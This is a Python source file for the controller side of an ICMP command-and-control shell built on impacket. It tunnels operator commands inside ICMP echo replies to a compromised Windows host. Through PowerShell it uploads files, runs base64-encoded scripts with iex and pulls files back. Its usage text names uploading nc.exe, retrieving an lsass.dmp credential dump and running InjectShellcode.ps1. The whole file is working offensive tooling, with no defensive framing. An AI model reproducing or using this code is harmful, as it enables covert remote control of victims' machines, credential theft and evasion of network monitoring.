#!/usr/bin/env python
from impacket import ImpactDecoder
from impacket import ImpactPacket
import os
import os.path
import select
import sys
import base64
import argparse
import socket
import fcntl
import struct

# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_shell.py -shell 10.49.117.244
# https://github.com/nocow4bob/PiX-C2


class ICMPC2(object):
    buffer, buffer_out, next_out = '', [], ''
    is_alive = False
    sock = None
    windows = True

    def __init__(self, options):
        self.dst = options.shell
        self.src = options.ip
        self.interface = options.interface
        self.decoder = ImpactDecoder.IPDecoder()

    def set_blocking(self, fd):
        flags = fcntl.fcntl(fd, fcntl.F_GETFL)
        flags = flags | os.O_NONBLOCK
        fcntl.fcntl(fd, fcntl.F_SETFL, flags)
        return self

    def get_ip_address(self, ifname='eth0'):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,
            struct.pack('256s', ifname[:15])
        )[20:24])

    def invoke_file(self, src_file):
        payload, n = [], 100
        try:
            if not os.path.isfile(src_file):
                sys.stdout.write("file doesn't exist %s\n" % src_file)
                return payload
            data = base64.b64encode(open(src_file.strip(), 'rb').read())
            chunks = [data[i:i + n] for i in range(0, len(data), n)]
            for chunk in chunks:
                if chunk != '':
                    payload.append('$d+="%s";echo "upload_success";' % chunk)
            chunk = 'try {iex($d);echo "upload_success";$d="";} ' \
                    'catch {echo "upload_fail";$d="";}'
            payload.append(chunk)
            sys.stdout.write('invoking file %s \n' % src_file)
        except Exception as err:
            sys.stderr.write('error invoke_file %s\n' % str(err))
        return payload

    def put_file(self, src_file, dst_file):
        payload, n = [], 100
        try:
            if not os.path.isfile(src_file):
                print("File doesn't exist %s\n" % src_file)
                return payload
            data = base64.b64encode(open(src_file.strip(), 'rb').read())
            chunks = [data[i:i + n] for i in range(0, len(data), n)]
            for chunk in chunks:
                if chunk != '':
                    payload.append('$d+="%s";echo "upload_success";' % chunk)
            chunk = 'try {[io.file]::writeallbytes("%s", [convert]::frombase64string($d));echo "upload_success";$d="";} ' \
                    'catch {echo "upload_fail";$d="";}'
            chunk = chunk % dst_file.strip().replace('/', '\\')
            payload.append(chunk)
            sys.stdout.write('uploading file %s to %s\n' % (src_file, dst_file))
        except Exception as err:
            print('Error put_file %s\n' % str(err))
        return payload

    def get_file(self, src_file, dst_file):
        payload = ''
        try:
            payload = 'try {$d=[convert]::tobase64string([io.file]::readallbytes("%s"));echo "start_get_file|%s|$($d)|' \
                      'end_get_file";} catch {echo "start_get_file|fail|fail|end_get_file";}'
            payload = payload % (src_file.replace('/', '\\'), dst_file)
            sys.stdout.write('downloading file %s to %s\n' % (src_file, dst_file))
        except Exception as err:
            print('Error get_file file %s\n' % str(err))
        return payload

    def write_get_file(self, enc_data):
        result = 'download_fail'
        try:
            idx = enc_data.split('get_file')[1]
            dst_data = idx.split('|')
            src_file, file_data = dst_data[1], dst_data[2]
            if src_file != 'fail':
                open(src_file, 'wb').write(base64.b64decode(file_data))
                result = 'download_success'
        except Exception as err:
            print('Error write_get_file %s\n' % str(err))
        return result

    def run_server(self):
        self.set_blocking(sys.stdin.fileno())
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except Exception as err:
            print('Socket error: %s' % err)
            sys.exit(1)

        if options.ip == '':
            self.src = self.get_ip_address(options.interface)
        print('Listening for calls on %s from shell %s' % (self.src, self.dst))

        self.sock.setblocking(0)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        ip = ImpactPacket.IP()
        ip.set_ip_src(self.src)
        ip.set_ip_dst(self.dst)
        icmp = ImpactPacket.ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
        decoder = ImpactDecoder.IPDecoder()

        while 1:
            cmd = ''
            if self.sock in select.select([self.sock], [], [])[0]:
                buff = self.sock.recv(4096)

                if 0 == len(buff):
                    self.sock.close()
                    sys.exit(0)

                ippacket = decoder.decode(buff)
                icmppacket = ippacket.child()
                if ippacket.get_ip_dst() == self.src \
                        and ippacket.get_ip_src() == self.dst \
                        and 8 == icmppacket.get_icmp_type():

                    ident = icmppacket.get_icmp_id()
                    seq_id = icmppacket.get_icmp_seq()
                    data = icmppacket.get_data_as_string()

                    if not self.is_alive:
                        print('Received call from %s' % self.dst)
                        self.is_alive = True

                    if len(data) > 0:
                        if 'start_get_file' in data and 'end_get_file' in data:
                            data, self.buffer = self.write_get_file(data), ''
                        elif 'start_get_file' in data and 'end_get_file' not in data:
                            self.buffer += data
                        elif 'start_get_file' in self.buffer and 'end_get_file' in self.buffer:
                            data = self.write_get_file(self.buffer)
                            self.buffer = ''
                        elif 'start_get_file' not in data and 'end_get_file' not in data and self.buffer != '':
                            self.buffer += data
                        elif 'start_get_file' not in data and 'end_get_file' in data:
                            self.buffer += data
                            data = self.write_get_file(self.buffer)
                            self.buffer = ''
                        elif 'AUTH' in data:
                            print('Auth request (auth <password>):')
                            data = ''
                        elif 'upload_success' in data:
                            if len(self.buffer_out) > 0:
                                self.next_out = self.buffer_out.pop(0)
                            else:
                                self.next_out = ''

                        if self.buffer == '' and len(self.buffer_out) <= 0 and self.next_out == '':
                            sys.stdout.write(data)

                    try:
                        if self.next_out != '':
                            cmd = self.next_out
                        else:
                            cmd = sys.stdin.readline()
                    except:
                        pass

                    if cmd == 'exit\n':
                        print('Exiting client (shell still running on host)')
                        return
                    if 'get_file' in cmd:
                        cmd_args = cmd.strip().split(' ')
                        src_file, dst_file = cmd_args[1], cmd_args[2]
                        print('Downloading %s to %s' % (src_file, dst_file))
                        cmd = self.get_file(src_file, dst_file)
                    elif 'auth' in cmd:
                        cmd_args = cmd.strip().split(' ')
                        cmd = str(cmd_args[1]).encode('ascii')
                        print('Authenticating using key %s' % cmd)
                    elif ('put_file' in cmd or 'invoke_file' in cmd) and len(self.buffer_out) <= 0:
                        cmd_args = cmd.strip().split(' ')
                        if cmd_args[0] == 'put_file':
                            src_file, dst_file = cmd_args[1], cmd_args[2]
                            print('Uploading %s to %s' % (src_file, dst_file))
                            self.buffer_out = self.put_file(src_file, dst_file)
                        else:
                            src_file = cmd_args[1]
                            print('Invoking payload %s' % src_file)
                            self.buffer_out = self.invoke_file(src_file)
                        cmd = ''
                        if len(self.buffer_out) > 0:
                            cmd = self.buffer_out.pop(0)

                    icmp.set_icmp_id(ident)
                    icmp.set_icmp_seq(seq_id)
                    icmp.contains(ImpactPacket.Data(cmd))
                    icmp.set_icmp_cksum(0)
                    icmp.auto_checksum = 1
                    ip.contains(icmp)
                    self.sock.sendto(ip.get_packet(), (self.dst, 0))


def main(options):
    icmp_shell = ICMPC2(options)
    icmp_shell.run_server()


if __name__ == '__main__':
    msg = 'Commands/Usage: \n\n'
    msg += 'Upload file: put_file /tmp/nc.exe c:/temp/nc.exe\n'
    msg += 'Download file: get_file c:/temp/lsass.dmp /tmp/lsass.dmp\n'
    msg += 'Invoke file: invoke_file /tmp/InjectShellcode.ps1\n'
    msg += 'Authenticate: auth P@ssword\n'
    msg += 'For C2 options use the Help command\n'
    parser = argparse.ArgumentParser(add_help=True, description='ICMP shell')
    try:
        parser.add_argument('-shell', action='store', help='IP address of ICMP shell')
        parser.add_argument('-ip', default='', action='store', help='IP address to listen for C2 (optional)')
        parser.add_argument('-interface', default='eth0', action='store', help='Interface to listen for C2 (optional)')

        if len(sys.argv) == 1:
            parser.print_help()
            print(msg)
            exit(1)
        print(msg)
        options = parser.parse_args()
        main(options=options)
    except Exception as err:
        sys.stderr.write(str(err))
